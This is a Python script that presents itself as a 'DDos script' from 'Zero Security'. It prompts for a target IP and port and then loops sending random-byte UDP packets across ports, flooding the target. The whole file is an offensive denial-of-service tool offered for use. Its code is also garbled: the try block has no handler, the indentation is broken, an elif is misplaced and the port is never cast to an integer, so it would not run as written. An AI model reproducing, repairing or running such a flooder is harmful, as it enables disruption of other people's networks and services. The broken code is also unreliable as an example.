#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Zero Security
from colorama import Fore, Back, Style
import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

run = os.system

run("clear")
print (Fore.GREEN + """
 _____                ____                       _ _         
|__  /___ _ __ ___   / ___|  ___  ___ _   _ _ __(_) |_ _   _ 
  / // _ \ '__/ _ \  \___ \ / _ \/ __| | | | '__| | __| | | |
 / /|  __/ | | (_) |  ___) |  __/ (__| |_| | |  | | |_| |_| |
/____\___|_|  \___/  |____/ \___|\___|\__,_|_|  |_|\__|\__, |
                                                      |___/ 
 =DDos script=

""")

print("З А Г Р У З К А....")
time.sleep(2.5)
os.system("clear")
print("🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼")

print (Fore.GREEN + "[1] > Start Attack\n[2] > Close")
data = input("\n>>> Enter ( 1 - 2 ) > ")
if data == "1":

    ip = input("\n>>> Enter Target IP => ")
    port = input("\n>>> Enter Port (Default 80) => ")
    print (Fore.BLUE + "\nPls Wait...\n")
    time.sleep(4)
    sent = 0 

while True:
        try:

        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print (Fore.RED + "=> Sent %s packets to %s trough port %s")%(sent, ip, port)
        if port == 65534:
            port = 1

elif data == "2":
    run("exit()")
    run("clear")
